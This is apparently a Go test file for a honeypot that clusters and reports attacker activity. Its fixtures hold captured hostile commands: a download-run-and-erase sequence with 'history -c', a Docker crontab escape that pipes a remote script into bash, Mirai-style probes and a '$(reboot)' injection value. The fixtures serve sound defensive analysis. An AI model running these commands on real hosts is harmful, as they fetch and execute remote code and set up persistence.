package main

// Fehler aus dem Live-Check von 0.8.0-beta: Zählung im Angriffsbericht, Familien.

import (
	"encoding/json"
	"fmt"
	"net/http/httptest"
	"os"
	"strings"
	"testing"
	"time"
)

// Angriffsbericht: Die Zahl der verschiedenen Kombinationen ist die echte, nicht die Länge
// der auf 40 gekürzten Liste.
func TestReportCountsAllCreds(t *testing.T) {
	base := time.Date(2026, 11, 20, 0, 51, 0, 0, time.UTC)
	var evs []*Event
	for i := range 1000 {
		e := loginEv("ssh", "root", fmt.Sprintf("pw%04d", i), nil)
		e.TS = base.Add(time.Duration(i) * time.Second)
		evs = append(evs, e)
	}
	r := BuildReport("IP 198.51.100.7", evs, false)
	if len(r.Creds) != reportMaxList || r.CredsN != 1000 {
		t.Fatalf("Liste %d, verschieden %d", len(r.Creds), r.CredsN)
	}
	sum := strings.Join(r.Summary, " ")
	if !strings.Contains(sum, "1000 Login-Versuche, jeder mit einer anderen Kombination") {
		t.Errorf("Kurzfassung: %s", sum)
	}
	// über der Obergrenze des Zählers: "über 2000"
	evs = nil
	for i := range 2100 {
		e := loginEv("ssh", "root", fmt.Sprintf("pw%05d", i), nil)
		e.TS = base.Add(time.Duration(i) * time.Second)
		evs = append(evs, e)
	}
	r = BuildReport("IP 198.51.100.7", evs, false)
	if sum := strings.Join(r.Summary, " "); !r.CredsMore || !strings.Contains(sum, "über 2000 verschiedenen Kombinationen") {
		t.Errorf("Obergrenze: %v %s", r.CredsMore, sum)
	}
	// Uhrzeiten in der eingestellten Zeitzone
	setHiveZone("Europe/Berlin")
	defer setHiveZone("")
	r = BuildReport("IP 198.51.100.7", evs[:10], false)
	if sum := strings.Join(r.Summary, " "); !strings.Contains(sum, "20.11.2026 01:51 bis") {
		t.Errorf("Zeitzone: %s", sum)
	}
}

// Ein Bot, der in jeder Sitzung eine neue Zufallskennung mitten in Wörtern benutzt
// ("check_<hex>_small_control"), bildet eine Familie, nicht viele.
func TestFamiliesEmbeddedHex(t *testing.T) {
	probe := func(id string, a, b int) []string {
		return []string{
			"sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_" + id + "_small_control'\"'\"' '\"'\"'check_" + id + "'\"'\"''",
			"printf '\\n%s|%s\\n' 'check_" + id + "_small_control' 'check_" + id + "'",
			fmt.Sprintf("printf '\\n%%s|%%s\\n' 'check_%s_small_math' \"$((%d*%d+6))\"", id, a, b),
			"printf '\\n%s|%s\\n' 'check_" + id + "_small_pid' \"$$\"",
		}
	}
	now := time.Now()
	var list []*Attack
	for i, id := range []string{"7c4d94de3cf0931616807ca1d36a2147", "005ed6c2efea0e2d836961f6c94a715a", "8e92dae83429eaa37299c5dee339c687", "230b2b7ac21346f5b6c610ef88f73d0d"} {
		list = append(list, &Attack{IP: fmt.Sprintf("203.0.113.%d", i+1), First: now.Add(-time.Duration(i+1) * time.Hour).UnixMilli(),
			Last: now.Add(-time.Duration(i+1) * time.Hour).UnixMilli(), Services: []string{"ssh"}, Commands: probe(id, 100+i*7, 400+i*13)})
	}
	// Mirai-Art: zufälliger Name hinter busybox, Wallet-Adressen
	for i, rnd := range []string{"aSkcLraK", "XmPqRtZw", "bNvCxZaS"} {
		list = append(list, &Attack{IP: fmt.Sprintf("198.51.100.%d", i+1), First: now.Add(-time.Duration(10+i) * time.Hour).UnixMilli(),
			Last: now.Add(-time.Duration(10+i) * time.Hour).UnixMilli(), Services: []string{"telnet"}, Commands: []string{"enable", "system", "shell", "sh", "/bin/busybox " + rnd}})
	}
	fams := buildFamilies(t.Context(), list, now)
	if len(fams) != 2 {
		for _, f := range fams {
			t.Logf("%s: %d", f.Name, f.Attacks)
		}
		t.Fatalf("%d Familien statt 2", len(fams))
	}
	// Normalisierung: Wörter bleiben, Zufälliges wird Platzhalter
	for in, want := range map[string]string{
		"echo check_7c4d94de3cf0931616807ca1d36a2147_small": "echo check_HEX_small",
		"echo sysde56f9f3f":                 "echo sysHEX",
		"echo deadbeefcafe":                 "echo deadbeefcafe",
		"/bin/busybox aSkcLraK":             "/bin/busybox RND",
		"systemctl NetworkManager":          "systemctl networkmanager",
		"-u 45zFhGRUgZNWPMMv7e6CLC6iZi9Emu": "-u RND",
	} {
		if got := normCommand(in); got != want {
			t.Errorf("normCommand(%q) = %q, erwartet %q", in, got, want)
		}
	}
}

// Gleich benannte, aber verschiedene Familien bekommen einen unterscheidenden Zusatz;
// eine abgebrochene Variante derselben Befehlsfolge fällt in dieselbe Familie.
func TestFamilyNamesDistinct(t *testing.T) {
	now := time.Now()
	mk := func(ip string, h int, cmds ...string) *Attack {
		ts := now.Add(-time.Duration(h) * time.Hour).UnixMilli()
		return &Attack{IP: ip, First: ts, Last: ts, Services: []string{"ssh"}, Commands: cmds}
	}
	long := []string{"cd /tmp", "wget http://198.51.100.9/x.sh", "chmod +x x.sh", "./x.sh start", "rm -f x.sh", "history -c", "cat /proc/cpuinfo", "free -m"}
	list := []*Attack{
		mk("203.0.113.1", 5, "uname -s -v -n -r -m"),
		mk("203.0.113.2", 4, "uname -s -m"),
		mk("203.0.113.3", 3, long...),
		mk("203.0.113.4", 2, long[:7]...), // bricht vor dem letzten Befehl ab
	}
	fams := buildFamilies(t.Context(), list, now)
	names := map[string]bool{}
	for _, f := range fams {
		if names[f.Name] {
			t.Errorf("Name doppelt: %s", f.Name)
		}
		names[f.Name] = true
	}
	if len(fams) != 3 {
		t.Errorf("%d Familien statt 3: %v", len(fams), names)
	}
	if !names["„uname -s -m“ über SSH"] || !names["„uname -s -v -n -r -m“ über SSH"] {
		t.Errorf("Namen: %v", names)
	}
}

// Dateien sammeln: Adressen von vor dem Einschalten oder aus einer ausgefallenen Runde
// werden nachgeholt (bis 0.8.0 nur die letzten 30 Minuten); nicht Geholtes hat einen Grund.
func TestShareSinceCatchesUp(t *testing.T) {
	allowDoc(t)
	setOwnNets(OwnNets{Private: true})
	h := shareHive(t)
	now := time.Now()
	h.st.db.Exec(`INSERT INTO events(ts,type,src_ip,service,sensor,as_org,data) VALUES(?,?,?,?,?,?,?)`,
		now.Add(-3*time.Hour).UnixMilli(), "command", "203.0.113.60", "dockerapi", "", "",
		`{"input":"create image=alpine cmd=chroot /mnt/ /bin/sh -c echo \"* * * * * root curl http://198.51.100.150/b2f628/cronb.sh|bash\">/etc/crontab binds=/:/mnt"}`)
	if s := h.shareSince(now); !s.Equal(now.Add(-24 * time.Hour)) {
		t.Fatalf("erste Runde: %v", now.Sub(s))
	}
	finds, err := h.urlFindings(t.Context(), h.shareSince(now), nil)
	if err != nil || len(finds) != 1 || finds[0].URL != "http://198.51.100.150/b2f628/cronb.sh" {
		t.Fatalf("Docker-Befehl von vor 3 Stunden nicht gefunden: %v %v", finds, err)
	}
	h.st.SetKV("share_since", fmt.Sprint(now.Add(-time.Hour).UnixMilli()))
	if s := h.shareSince(now); now.Sub(s).Round(time.Second) != 65*time.Minute {
		t.Fatalf("nach einer Runde: %v", now.Sub(s))
	}
	h.st.SetKV("share_since", fmt.Sprint(now.Add(-30*24*time.Hour).UnixMilli()))
	if s := h.shareSince(now); now.Sub(s) != 48*time.Hour {
		t.Fatalf("höchstens 48 Stunden: %v", now.Sub(s))
	}
	// Gründe für nicht Geholtes
	x := h.Extras()
	x.Samples.Enabled = true
	h.collectSample(t.Context(), x, urlFinding{URL: "tftp://198.51.100.41/x"})
	addEvent(h, "command", "ssh", "203.0.113.61", "", "Censys, Inc.", map[string]any{"input": "wget http://198.51.100.42/c"})
	h.urlFindings(t.Context(), now.Add(-time.Hour), h.share.skip)
	got := map[string]string{}
	for _, s := range h.share.skips {
		got[s.URL] = s.Reason
	}
	if !strings.Contains(got["tftp://198.51.100.41/x"], "nur http und https") || !strings.Contains(got["http://198.51.100.42/c"], "Forschungsscanner") {
		t.Fatalf("Gründe: %v", got)
	}
}

// Sperrliste der Drossel (hivornet-firewall bans) und Hinweise für die UI.
func TestBruteBans(t *testing.T) {
	dir := t.TempDir()
	p := dir + "/brute-bans"
	now := time.Now().Unix()
	os.WriteFile(p, []byte(fmt.Sprintf("ok\n%d\nDrossel aktiv\n198.51.100.7 %d\n203.0.113.9 %d\n$(reboot) 5\n2001:db8::5 %d\nkaputt\n",
		now, now+600, now-5, now+3600)), 0o644)
	f := readBruteBans(p)
	if f == nil || f.State != "ok" || len(f.Bans) != 3 || f.Bans["2001:db8::5"] != (now+3600)*1000 {
		t.Fatalf("gelesen: %+v", f)
	}
	t.Setenv("HIVE_BRUTE_REQUEST", dir+"/brute-request")
	t.Setenv("HIVE_BRUTE_BANS", p)
	bruteBanCache.at = time.Time{}
	h := testHive(t)
	x := h.Extras()
	x.Brute.Limit = true
	h.extras.x = x
	l := h.bruteLimit()
	if l.Platform != "pi" || !l.Known || l.Rate != 6 {
		t.Fatalf("Stand: %+v", l)
	}
	b := h.bruteBansFor([]string{"198.51.100.7", "203.0.113.9", "192.0.2.1"})
	if len(b) != 1 || b["198.51.100.7"] != (now+600)*1000 {
		t.Fatalf("Sperren: %v (abgelaufene und fremde IPs dürfen fehlen)", b)
	}
	// veraltete Datei: Status je IP unbekannt
	os.WriteFile(p, []byte(fmt.Sprintf("ok\n%d\nDrossel aktiv\n", now-600)), 0o644)
	bruteBanCache.at = time.Time{}
	if l := h.bruteLimit(); l.Known || !strings.Contains(l.Note, "veraltet") {
		t.Fatalf("veraltet: %+v", l)
	}
	if readBruteBans(dir+"/fehlt") != nil {
		t.Fatal("fehlende Datei")
	}
}

// Top-Listen ohne Dauer-Brute-Force: verdichtete Versuche ("bf:<feld>") werden abgezogen.
func TestTopWithoutBrute(t *testing.T) {
	h := testHive(t)
	hr := time.Now().UnixMilli() / 3600000
	for _, r := range []struct {
		field, key string
		n          int
	}{{"cred", "root / 123456", 1300}, {"bf:cred", "root / 123456", 1250}, {"cred", "admin / admin", 80},
		{"asn", "64496", 1400}, {"bf:asn", "64496", 1400}, {"asn", "64500", 30}} {
		h.st.db.Exec(`INSERT INTO top_hourly(hour, field, key, label, n) VALUES(?,?,?,?,?)`, hr, r.field, r.key, "", r.n)
	}
	get := func(q string) []map[string]any {
		rec := httptest.NewRecorder()
		h.top(rec, httptest.NewRequest("GET", "/api/stats/top?range=24h&"+q, nil))
		var out []map[string]any
		json.Unmarshal(rec.Body.Bytes(), &out)
		return out
	}
	if l := get("field=cred"); len(l) != 2 || l[0]["key"] != "root / 123456" {
		t.Fatalf("mit: %v", l)
	}
	if l := get("field=cred&nobrute=1"); len(l) != 2 || l[0]["key"] != "admin / admin" || l[1]["n"].(float64) != 50 {
		t.Fatalf("ohne: %v", l)
	}
	if l := get("field=asn&nobrute=1"); len(l) != 1 || l[0]["key"] != "64500" {
		t.Fatalf("Netzbetreiber ohne: %v", l)
	}
}

// Zusammengehörige IPs: der Fall aus dem Live-Check (Nachbaradressen, gleiche Liste) wird
// gebündelt; gemeinsames Werkzeug, Netz oder Standardpasswörter allein bündeln nicht.
func TestRelatedIPs(t *testing.T) {
	creds := func(n int, prefix string) map[string]int {
		m := map[string]int{}
		for i := range n {
			m[fmt.Sprintf("root / %s%04d", prefix, i)] = 1
		}
		return m
	}
	mk := func(ip string, asn int, c map[string]int, fps ...string) *Attack {
		return &Attack{IP: ip, ASN: asn, creds: c, Fingerprints: fps, Clients: []string{"SSH-2.0-Go"}}
	}
	common := "HASSH 0a1b2c3d4e5f60718293a4b5c6d7e8f9" // Go-Standard, viele Fremde
	list := []*Attack{
		mk("198.51.100.161", 64500, creds(1286, "x"), common), // Nachbaradressen mit gleicher Liste (Live-Check)
		mk("198.51.100.140", 64500, creds(1286, "x"), common),
		mk("203.0.113.5", 64500, map[string]int{"root / root": 1, "admin / admin": 1, "root / 123456": 1}, common), // Mirai-Standard
		mk("203.0.113.6", 64500, map[string]int{"root / root": 1, "admin / admin": 1, "root / 123456": 1}, common),
	}
	for i := range 12 { // dasselbe Werkzeug bei vielen
		list = append(list, mk(fmt.Sprintf("192.0.2.%d", i+1), 64501, creds(20, fmt.Sprint(i)), common))
	}
	// seltener Fingerabdruck im selben Netz, sonst nichts gemeinsam
	list = append(list, mk("192.0.2.200", 64502, nil, "JA4 t13d1516h2_8daaf6152771_rare"), mk("192.0.2.201", 64503, nil, "JA4 t13d1516h2_8daaf6152771_rare"))
	// derselbe seltene Fingerabdruck in fremdem Netz und AS: nicht bündeln
	list = append(list, mk("198.51.100.250", 64504, nil, "JA4 t13d_other_rare"), mk("203.0.113.250", 64505, nil, "JA4 t13d_other_rare"))
	// dieselben ersten 20 Versuche in derselben Reihenfolge, aber unterschiedlich lang
	// (ein Angriff läuft noch): im selben Netz gebündelt, in fremden Netzen nicht
	var order []string
	for i := range 20 {
		order = append(order, fmt.Sprintf("admin / w%02d", i))
	}
	seq := func(ip string, asn, n int) *Attack {
		a := mk(ip, asn, creds(n, "w"))
		a.credOrder = order
		return a
	}
	list = append(list, seq("198.51.100.30", 64510, 1286), seq("198.51.100.31", 64510, 700),
		seq("192.0.2.30", 64511, 1100), seq("203.0.113.30", 64512, 900))
	r := buildRelated(list)
	if g, o := r.related("198.51.100.31"); g == nil || len(o) != 1 || o[0].IP != "198.51.100.30" || !strings.Contains(strings.Join(o[0].Reasons, ";"), "ersten 20 Zugangsdaten") {
		t.Fatalf("Reihenfolge: %+v %+v", g, o)
	}
	if r.groups["192.0.2.30"] != nil || r.groups["203.0.113.30"] != nil {
		t.Error("gleiche Reihenfolge ohne gemeinsames Netz oder AS gebündelt")
	}
	g, others := r.related("198.51.100.161")
	if g == nil || g.NIPs != 2 || len(others) != 1 || others[0].IP != "198.51.100.140" || !strings.Contains(strings.Join(others[0].Reasons, ";"), "dieselbe Zugangsdatenliste (1286 Kombinationen)") {
		t.Fatalf("Live-Fall: %+v %+v", g, others)
	}
	for _, ip := range []string{"203.0.113.5", "192.0.2.1", "198.51.100.250"} {
		if g := r.groups[ip]; g != nil {
			t.Errorf("%s fälschlich gebündelt: %+v", ip, g)
		}
	}
	if g := r.groups["192.0.2.200"]; g == nil || !strings.Contains(strings.Join(g.Reasons, ";"), "aus demselben Netz 192.0.2.0/24") {
		t.Errorf("seltener Fingerabdruck im selben Netz: %+v", g)
	}
}

// Updater: der neue Zeitgeber für die Sperrliste wird auf laufenden Geräten eingeschaltet.
func TestApplySystemBruteBansTimer(t *testing.T) {
	var calls []string
	applySystem([]string{"etc/systemd/system/hivornet-brute-bans.timer", "etc/systemd/system/hivornet-brute-bans.service"},
		func(n string, a ...string) error { calls = append(calls, n+" "+strings.Join(a, " ")); return nil }, os.Stderr)
	if j := strings.Join(calls, "\n"); !strings.Contains(j, "systemctl enable --now hivornet-brute-bans.timer") {
		t.Fatalf("Zeitgeber nicht eingeschaltet:\n%s", j)
	}
}

// Gruppe A–B–C: A und C teilen kein Merkmal direkt. Die Begründungsliste darf trotzdem nie
// null sein, sonst bricht die Angreiferseite ab ("Cannot read properties of null").
func TestRelatedReasonsNeverNil(t *testing.T) {
	g := &IPGroup{ID: "x", NIPs: 3, IPs: []string{"192.0.2.1", "192.0.2.2", "192.0.2.3"}}
	r := &relatedResult{
		groups: map[string]*IPGroup{"192.0.2.1": g, "192.0.2.2": g, "192.0.2.3": g},
		edges: map[string]map[string]string{
			"192.0.2.1": {"k1": "Merkmal 1"},
			"192.0.2.2": {"k1": "Merkmal 1", "k2": "Merkmal 2"},
			"192.0.2.3": {"k2": "Merkmal 2"},
		},
		byKey: map[string][]string{"k1": {"192.0.2.1", "192.0.2.2"}, "k2": {"192.0.2.2", "192.0.2.3"}},
	}
	_, others := r.related("192.0.2.1")
	if len(others) != 2 {
		t.Fatalf("%+v", others)
	}
	for _, o := range others {
		if o.Reasons == nil {
			t.Errorf("%s: reasons ist nil", o.IP)
		}
	}
	b, _ := json.Marshal(others)
	if strings.Contains(string(b), "null") {
		t.Errorf("JSON enthält null: %s", b)
	}
}
